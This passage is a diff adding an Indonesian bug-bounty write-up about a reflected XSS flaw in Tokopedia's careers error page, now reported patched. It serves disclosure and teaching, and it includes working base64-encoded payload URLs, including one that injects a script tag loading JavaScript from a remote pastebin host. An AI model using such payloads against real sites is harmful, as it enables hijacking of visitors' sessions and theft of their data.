@@ -1,0 +1,41 @@
+I"$<p><img src="/images/xss_img.jpg" alt="Image of XSS" /></p>
+
+<p>Beberapa waktu yang lalu, saya mencoba mencari Bug di situs salah satu E-Commerce di Indonesia, yaitu Tokopedia. Setelah beberapa lama melakukan Pencarian, saya menemukan link yang berisi pesan error pada Tokopedia Careers. Bentuk link nya seperti ini:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tokopedia.com/careers/error/?job_ref=M2QtbW90aW9uLWdyYXBoZXItZm9yLWJ1c2luZXNzLWluLWluZG9uZXNpYQ==&amp;err=VmFsaWRhdGlvbiBmYWlsZWQ6IERvd25sb2FkIFlvdSBhcmUgbm90IGFsbG93ZWQgdG8gdXBsb2FkICJzdmciIGZpbGVzLCBhbGxvd2VkIHR5cGVzOiBwZGYsIGRvYywgZG9jeCwgb2R0LCBydGYsIGh0bWwsIGh0bSwgdHh0&amp;app_url=aHR0cHM6Ly90b2tvcGVkaWEud29ya2FibGUuY29tL2pvYnMvNDE5NzU5L2NhbmRpZGF0ZXMvbmV3
+</code></pre></div></div>
+
+<p>Dan tampilannya seperti berikut:</p>
+
+<p><img src="/images/tokped_refxss1.jpg" alt="Image of Tokopedia Reflected XSS" /></p>
+
+<p>Dilihat dari struktur URL nya, dapat dipastikan bahwa value dari parameter job_ref, err, dan app_url di-encode dengan base64. Lalu saya melihat source code nya, dan benar saya, value tersebut di-decode dan ditampilkan pada browser.</p>
+
+<p>Lalu darisitu saya mencoba melakukan testing dengan memasukan “TES XSS” yang di-encode dengan base64 pada parameter job_ref dengan menggunakan URL berikut:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tokopedia.com/careers/error/?job_ref=VEVTIFhTUw
+</code></pre></div></div>
+
+<p>Dan source nya berubah menjadi seperti berikut:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div class="text-center"&gt;
+            &lt;a href="https://www.tokopedia.com/careers/job/TES XSS" class="btn-tkpd btn--medium btn--green" style="width: 200px;"&gt;Back to Job Details&lt;/a&gt;
+        &lt;/div&gt;
+</code></pre></div></div>
+
+<p>Terlihat bahwa “TES XSS” masuk kedalam attribut <strong>href</strong>.
+Karna ada di dalam Tag <strong>a</strong>, maka untuk mentriger XSS kita memerlukan <strong>HTML Event Attributes</strong> seperti onload, onmouseover, dll. Untuk contoh kali ini saya menggunakan onmouseover.</p>
+
+<p>Payloadnya seperti berikut:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tokopedia.com/careers/error/?job_ref=eCIgb25tb3VzZW92ZXI9YWxlcnQoMTMzNyk7Ly8
+</code></pre></div></div>
+
+<p>Dan XSS akan ter-triger ketika mouse menyentuh link.</p>
+
+<p><img src="/images/tokped_refxss2.jpg" alt="Image of Tokopedia Reflected XSS" /></p>
+
+<p>Payload juga dapat dimodifikasi untuk menghilangkan user interaction, disini saya menggunakan: <strong>”&gt;&lt;script src=//&gt;</strong> dan XSS akan tereksekusi otomatis ketika link dikunjungi.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tokopedia.com/careers/error/?job_ref=Ij48Zm9ybT48L2Zvcm0gPjxzY3JpcHQgc3JjPSJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvMUNrTDFFc1oiPjwvU2NSaXB0PjxhICI
+</code></pre></div></div>
+
+<p><strong>Status: Valid but Out of Scope (Patched)</strong></p>
+:ET
